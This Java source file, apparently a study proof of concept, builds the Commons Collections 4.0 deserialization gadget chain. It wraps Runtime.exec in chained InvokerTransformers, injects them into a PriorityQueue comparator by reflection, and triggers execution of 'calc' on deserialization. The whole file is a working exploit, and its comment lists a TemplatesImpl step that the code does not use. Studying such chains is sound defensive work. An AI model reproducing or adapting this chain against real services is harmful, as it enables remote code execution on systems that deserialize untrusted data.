import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import sun.misc.BASE64Decoder;

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

import static util.Util.serialize;
import static util.Util.unserialize;

public class Commoncollections2 {
/*调用链:
PriorityQueue.readObject()
    TransformingComparator.compare()
        ChainedTransformer.transform()
                InvokerTransformer.transform()
                    TemplatesImpl.newTransformer()
*/
/*版本依赖:
   commons-collections4 : 4.0
*/
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Class[]{Runtime.class, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        TransformingComparator comparator=new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue =new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field =Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue,comparator);
        serialize(priorityQueue);
        unserialize();
    }
}
